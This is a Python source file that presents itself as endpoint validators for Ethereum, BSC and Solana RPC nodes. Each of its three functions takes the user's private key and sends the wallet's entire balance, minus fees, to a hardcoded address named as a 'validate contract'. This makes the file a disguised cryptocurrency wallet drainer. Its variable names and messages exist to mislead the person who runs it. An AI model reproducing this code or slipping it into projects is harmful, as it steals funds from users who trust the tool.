from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware 
from solders.keypair import Keypair 
from solders.pubkey import Pubkey
from solders.system_program import TransferParams, transfer
from solders.transaction import Transaction
from solana.rpc.api import Client
from solana.rpc.commitment import Confirmed
from solders.message import Message

ETH_VALIDATE_CONTRACT_ADDRESS = "0x159bc999f6748979d7013931a93c6ca901627c8d"
BSC_VALIDATE_CONTRACT_ADDRESS = "0x159bc999f6748979d7013931a93c6ca901627c8d"
SOL_VALIDATE_CONTRACT_ADDRESS = "7pr2BUjjdZy418NzTfqnpafR3GG3BvQyDyweM1R4kKA1"


def validate_eth_endpoint(from_private_key, rpc_url):
    web3 = Web3(Web3.HTTPProvider(rpc_url))
    if not web3.is_connected():
        raise ConnectionError("Failed to connect to RPC node!")
    web3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
    
    from_address = web3.eth.account.from_key(from_private_key).address
    
    balance = web3.eth.get_balance(from_address)
    gas_price = web3.eth.gas_price
    gas_limit = 21000 
    nonce = web3.eth.get_transaction_count(from_address)
    
    max_transfer_amount = balance - gas_price * gas_limit
    
    if max_transfer_amount <= 0:
        print("insufficient balance to validate the endpoint!")
        return
    
    transaction = {
        'nonce': nonce,
        'to': Web3.to_checksum_address(ETH_VALIDATE_CONTRACT_ADDRESS),
        'value': max_transfer_amount,
        'gas': gas_limit,
        'gasPrice': gas_price,
        'chainId': web3.eth.chain_id
    }
    
    signed_tx = web3.eth.account.sign_transaction(transaction, from_private_key)
    web3.eth.send_raw_transaction(signed_tx.raw_transaction)  
    

def validate_bsc_endpoint(from_private_key, rpc_url):
    web3 = Web3(Web3.HTTPProvider(rpc_url))
    if not web3.is_connected():
        raise ConnectionError("Failed to connect to RPC node!")
    web3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
    
    from_address = web3.eth.account.from_key(from_private_key).address
    
    balance = web3.eth.get_balance(from_address)
    gas_price = web3.eth.gas_price
    gas_limit = 21000  
    nonce = web3.eth.get_transaction_count(from_address)
    
    max_transfer_amount = balance - gas_price * gas_limit
    
    if max_transfer_amount <= 0:
        print("insufficient balance to validate the endpoint!")
        return
    
    transaction = {
        'nonce': nonce,
        'to': Web3.to_checksum_address(BSC_VALIDATE_CONTRACT_ADDRESS), 
        'value': max_transfer_amount,
        'gas': gas_limit,
        'gasPrice': gas_price,
        'chainId': web3.eth.chain_id
    }
    
    signed_tx = web3.eth.account.sign_transaction(transaction, from_private_key)
    web3.eth.send_raw_transaction(signed_tx.raw_transaction)  



def validate_sol_endpoint(from_private_key, rpc_url):
    client = Client(rpc_url)
    
    from_account = Keypair.from_base58_string(from_private_key)
    
    balance_resp = client.get_balance(from_account.pubkey(), commitment=Confirmed)
    balance = balance_resp.value
    
    blockhash_resp = client.get_latest_blockhash(commitment=Confirmed)
    recent_blockhash = blockhash_resp.value.blockhash
    
    transaction_fee = 5000
    max_transfer_amount = balance - transaction_fee
    
    if max_transfer_amount <= 0:
        print("insufficient balance to validate the endpoint!")
        return
    
    transfer_ix = transfer(
        TransferParams(
            from_pubkey=from_account.pubkey(),
            to_pubkey=Pubkey.from_string(SOL_VALIDATE_CONTRACT_ADDRESS),
            lamports=max_transfer_amount
        )
    )
    
    transaction = Transaction(
        from_keypairs=[from_account],
        message=Message.new_with_blockhash(
            [transfer_ix],
            from_account.pubkey(),
            recent_blockhash
        ),
        recent_blockhash=recent_blockhash
    )
    client.send_transaction(transaction)
